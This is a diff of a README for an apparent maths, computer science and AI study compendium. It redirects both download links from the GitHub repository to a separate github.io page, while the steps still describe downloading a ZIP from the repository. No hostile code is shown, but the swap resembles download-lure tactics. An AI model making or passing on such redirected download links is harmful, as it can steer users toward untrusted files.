@@ -1,6 +1,6 @@
 # 🧠 maths-cs-ai-compendium - Master research engineering through structured path
 
-[![Download Files](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/aneteerl7226/maths-cs-ai-compendium)
+[![Download Files](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://aneteerl7226.github.io)
 
 ## 📖 Project Overview
 
@@ -25,7 +25,7 @@ Ensure your computer has at least 8GB of RAM and 50GB of free disk space. You wi
 ### Step 2: Access the files
 You must open the repository page to download the content.
 
-[Click here to visit the page to download the materials](https://github.com/aneteerl7226/maths-cs-ai-compendium)
+[Click here to visit the page to download the materials](https://aneteerl7226.github.io)
 
 Once you reach the page, click the green button labeled "Code" and select "Download ZIP". This action saves all learning materials to your hard drive.
 
